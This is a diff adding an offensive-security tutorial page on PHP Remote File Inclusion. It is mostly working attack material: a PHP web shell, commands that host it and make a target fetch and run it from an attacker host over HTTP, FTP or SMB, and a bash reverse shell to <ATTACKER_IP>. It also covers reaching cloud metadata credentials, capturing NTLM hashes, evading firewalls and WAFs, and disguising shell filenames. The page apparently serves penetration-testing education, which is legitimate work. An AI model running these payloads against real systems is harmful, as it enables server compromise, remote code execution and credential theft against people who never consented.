@@ -1,0 +1,302 @@
+---
+title: RFI - Remote File Inclusion
+description: Including remote files for RCE via HTTP, FTP, and SMB - hosting a PHP shell and getting the target to fetch and execute it.
+mitre: [T1190, T1059]
+d3fend: [D3-EAL, D3-NTA]
+impact: [ServerSideEval, RCE, InternalAccess]
+owasp: [A03]
+sidebar:
+  order: 6
+  label: RFI
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+When the inclusion function supports remote URLs, host a PHP payload on your own server and include it. The target fetches your file, executes it, returns the output.
+
+```
+# Confirm RFI works - include a known-good local URL first
+?page=http://127.0.0.1/index.php
+
+# Host a shell on your attacker box
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+sudo python3 -m http.server 80
+
+# Trigger inclusion
+?page=http://<ATTACKER_IP>/shell.php&cmd=id
+
+# Other transports when HTTP is blocked
+?page=ftp://<ATTACKER_IP>/shell.php&cmd=id
+?page=\\<ATTACKER_IP>\share\shell.php&cmd=id        # Windows-only, SMB
+```
+
+Success indicator: command output (`uid=...` for `id`) in the response.
+
+## Prerequisites
+
+RFI requires three conditions, in order of likelihood-of-failure:
+
+1. **The inclusion function supports remote URLs.** Not every LFI is an RFI - `require()` doesn't, `file_get_contents()` does. See the [overview](/codex/web/lfi/) table.
+
+2. **`allow_url_include = On`** in the PHP config. Default is `Off` in modern PHP. Check via [`php://filter`](/codex/web/lfi/php-filters/) reading the `php.ini`:
+   ```bash
+   curl -s "https://target/?page=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini" \
+       | grep -oE '[A-Za-z0-9+/=]{200,}' | base64 -d | grep allow_url_include
+   ```
+
+3. **Outbound network access from the target to your hosting server.** Many production environments restrict outbound traffic. If port 80/443 are filtered, FTP or SMB might still work. If all outbound is blocked, RFI is closed.
+
+The Windows SMB exception is notable: SMB inclusion via UNC paths doesn't require `allow_url_include` because Windows treats UNC paths as local file paths. If the target is on Windows and you can reach it over SMB, you bypass condition #2.
+
+## Confirming RFI
+
+The cleanest first probe - include a URL the target can definitely reach (itself):
+
+```
+?page=http://127.0.0.1/index.php
+```
+
+What you should see: the target's own index page rendered inside the response (twice if the inclusion is mid-page). This confirms:
+
+- The wrapper recognizes `http://` URLs
+- The fetch succeeded
+- The fetched content is being processed (executed for PHP-able sinks, returned as text for read-only sinks)
+
+If the rendered output includes PHP-executed content (not raw `<?php` tags), the inclusion *executes* the fetched file - RCE is reachable. If it shows raw source, only file disclosure works.
+
+<Aside type="caution">
+Including the *vulnerable page itself* (e.g., `?page=http://127.0.0.1/index.php`) can cause infinite recursion. The page includes itself, which includes itself, until the server runs out of resources. Use a different known page (`info.php`, `about.html`) for the confirmation probe.
+</Aside>
+
+## HTTP-based RFI
+
+The standard path. Host a PHP shell on your machine, include it from the target.
+
+### Setup
+
+```bash
+# Step 1 - write the shell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+# Step 2 - host on port 80 (sudo needed for low ports, but reduces firewall friction)
+sudo python3 -m http.server 80
+# Output:
+# Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+# Step 3 - trigger inclusion
+curl "https://target/?page=http://<ATTACKER_IP>/shell.php&cmd=id"
+```
+
+The Python server logs the inclusion request:
+
+```
+target.ip - - [...] "GET /shell.php HTTP/1.0" 200 -
+```
+
+The HTTP response from the target includes the output of `id`:
+
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### Why port 80 specifically
+
+Two reasons:
+- **Firewall traversal** - corporate firewalls often allow outbound 80 and 443 but block other ports. Hosting on 80 maximizes the chance of reachability.
+- **WAF avoidance** - some WAFs treat outbound requests to non-standard ports as suspicious. Port 80 looks like a normal HTTP fetch.
+
+Port 443 is similar but requires a real or self-signed TLS cert - Python's `http.server` doesn't do TLS by default.
+
+### When the URL gets a `.php` appended
+
+A common LFI sink appends `.php`:
+
+```php
+include($_GET['page'] . ".php");
+```
+
+Your `?page=http://<ATTACKER_IP>/shell.php` becomes `http://<ATTACKER_IP>/shell.php.php`. Two fixes:
+
+1. **Rename the hosted file**:
+   ```bash
+   mv shell.php shell.php.php       # so the .php suffix lines up
+   ```
+
+2. **Use a trailing `?` or `#`** to terminate the URL before the appended extension:
+   ```
+   ?page=http://<ATTACKER_IP>/shell.php?       # ? makes the rest a query string
+   ?page=http://<ATTACKER_IP>/shell.php%23     # %23 = # makes it a fragment
+   ```
+
+The `?` trick is cleaner - the appended `.php` becomes part of the query string and doesn't affect file resolution on the attacker server.
+
+### Verifying request shape
+
+Check exactly what the target sent by reading the Python server log:
+
+```bash
+sudo python3 -m http.server 80 2>&1 | tee /tmp/http.log
+
+# In another terminal, watch the log
+tail -f /tmp/http.log
+```
+
+The log shows the exact path requested. If it shows `/shell.php.php` instead of `/shell.php`, you know the extension was appended and need to adjust.
+
+## FTP-based RFI
+
+When HTTP is blocked, FTP often isn't - port 21 is sometimes overlooked in egress filtering.
+
+### Setup
+
+```bash
+# Install pyftpdlib if needed
+pip install pyftpdlib
+
+# Run anonymous FTP server in the current directory
+sudo python3 -m pyftpdlib -p 21
+```
+
+Default settings: anonymous read access, current directory shared. Drop your `shell.php` in the directory before starting.
+
+### Inclusion
+
+```
+?page=ftp://<ATTACKER_IP>/shell.php&cmd=id
+```
+
+By default, PHP attempts FTP login as anonymous. If the FTP server requires authentication, embed credentials:
+
+```
+?page=ftp://user:password@<ATTACKER_IP>/shell.php&cmd=id
+```
+
+### Caveats
+
+- FTP fetch is slower than HTTP - passive-mode handshakes add latency
+- FTP servers behind NAT may have issues with PASV mode - most cloud VMs need the public IP advertised explicitly
+- Modern egress filters increasingly include port 21
+
+When HTTP and FTP both fail, the egress is genuinely restricted - RFI is closed for the moment. Pivot to LFI-only techniques.
+
+## SMB-based RFI (Windows targets)
+
+Special case: when the target is Windows, UNC paths to remote SMB shares work as if they were local files. **`allow_url_include` is not required** - Windows treats `\\server\share\file` as a local path.
+
+### Setup
+
+```bash
+# Impacket's smbserver, anonymous access by default with -smb2support
+impacket-smbserver -smb2support share /tmp/rfi-share
+
+# Drop your shell in /tmp/rfi-share
+echo '<?php system($_GET["cmd"]); ?>' > /tmp/rfi-share/shell.php
+```
+
+### Inclusion
+
+UNC path syntax. Forward slashes can be used interchangeably with backslashes in most PHP setups:
+
+```
+?page=\\<ATTACKER_IP>\share\shell.php&cmd=id
+?page=//<ATTACKER_IP>/share/shell.php&cmd=id
+```
+
+URL-encoded for transport:
+
+```
+?page=%5C%5C<ATTACKER_IP>%5Cshare%5Cshell.php&cmd=id
+```
+
+### Caveats
+
+- **Works reliably only on same-LAN scenarios.** Windows SMB over the internet is usually blocked by ISP egress filtering and firewall defaults.
+- **Server 2019+ may refuse outbound anonymous SMB.** Default SMB-client hardening on recent Windows builds disables guest authentication.
+- **NTLM hashes get sent in the SMB authentication handshake.** If your SMB server captures the hashes (via `Responder` instead of plain SMB), you may not even need the file inclusion - the captured NTLMv2 hashes from the target's authenticated SMB connection can be cracked offline.
+
+The NTLM-capture side effect is sometimes the real win - RFI via SMB to a host on the same LAN frequently yields hashes from the web server's machine account, which can be relayed or cracked.
+
+## Cross-protocol RFI
+
+Some `allow_url_include`-enabled environments support less common URL schemes:
+
+```
+?page=php://input                            # see Wrappers page
+?page=data://text/plain;base64,...           # see Wrappers page
+?page=gopher://...                           # rare; see SSRF for gopher tricks
+?page=expect://id                            # see Wrappers page
+?page=phar://...                             # see File-upload chain
+```
+
+The `gopher://` scheme is more commonly an SSRF vector than an RFI vector. See the [SSRF schemas](/codex/web/server-side/ssrf/schemas/) page for details.
+
+## RFI as SSRF
+
+Even when RFI doesn't yield RCE (the inclusion function only reads, not executes), it's still an SSRF primitive:
+
+```
+?page=http://internal.corp.local/admin
+?page=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+?page=http://127.0.0.1:8080/                 # localhost-only services
+```
+
+The target's response includes whatever the fetched URL returned. This is functionally identical to [SSRF](/codex/web/server-side/ssrf/) - internal-network access, cloud metadata, port scanning.
+
+The distinction matters for reporting: RFI-with-RCE is critical, RFI-as-SSRF is high (still serious, lower direct impact). The same primitive enables both.
+
+## Workflow
+
+A complete RFI engagement against a target with HTTP egress:
+
+```bash
+# 1. Confirm vulnerable parameter
+curl 'https://target/?page=/etc/passwd'                   # Yes, LFI works
+
+# 2. Check allow_url_include via PHP filter
+curl -s 'https://target/?page=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini' \
+    | grep -oE '[A-Za-z0-9+/=]{200,}' | base64 -d \
+    | grep allow_url_include
+# allow_url_include = On      → RFI feasible
+
+# 3. Confirm RFI with same-host include
+curl 'https://target/?page=http://127.0.0.1/info.php'     # See own info.php - confirms remote URL parsing
+
+# 4. Set up payload host
+cat > /tmp/rfi/shell.php <<'EOF'
+<?php
+$cmd = $_GET['cmd'] ?? 'id';
+echo "[CMD] $cmd\n";
+echo `$cmd`;
+EOF
+
+cd /tmp/rfi && sudo python3 -m http.server 80 &
+
+# 5. Trigger
+curl 'https://target/?page=http://<ATTACKER_IP>/shell.php?&cmd=id'
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+# 6. Upgrade to interactive shell
+curl 'https://target/?page=http://<ATTACKER_IP>/shell.php?&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<ATTACKER_IP>%2F4444%200%3E%261%22'
+# Catch on nc -lvnp 4444
+```
+
+## Detection-only payloads
+
+```
+?page=http://<COLLAB>/rfi-probe                          # Burp Collaborator or similar OOB callback
+?page=http://127.0.0.1/index.php                         # confirms RFI without external infra
+```
+
+The OOB-callback probe is useful when the inclusion succeeds but doesn't produce visible output. A request landing at your Collaborator host confirms the application made the fetch - even if it couldn't display the result.
+
+## Notes
+
+- **`allow_url_include` blocks `http://` but not `php://filter`.** When the config disables remote URL inclusion, local-file LFI still works. RFI is just one of the LFI exploitation paths - its closure doesn't close the underlying bug.
+- **Egress filtering is the most common reason RFI fails.** The target may be vulnerable in code but unable to reach your hosting server. Try ports 80, 443, 21, and (for Windows) 445 before declaring RFI dead.
+- **The hosted file's name affects logging.** Both the attacker's HTTP server and the target's access logs record the URL. Use innocuous filenames during stealth-required engagements (`favicon.ico`, `logo.png`) - though if the target executes the response as PHP regardless of name, this is just OPSEC, not a functional requirement.
+- **RFI on cloud-hosted apps reaches the metadata service.** Combine with the [SSRF](/codex/web/server-side/ssrf/) cluster's metadata-service techniques - RFI is functionally another SSRF transport for the same attack class.
+
+<Aside type="tip">
+The simplest way to know whether RFI works on a target: read the PHP config via `php://filter` and grep for `allow_url_include`. One request answers the question definitively, faster than trying various wrappers and interpreting failure modes.
+</Aside>
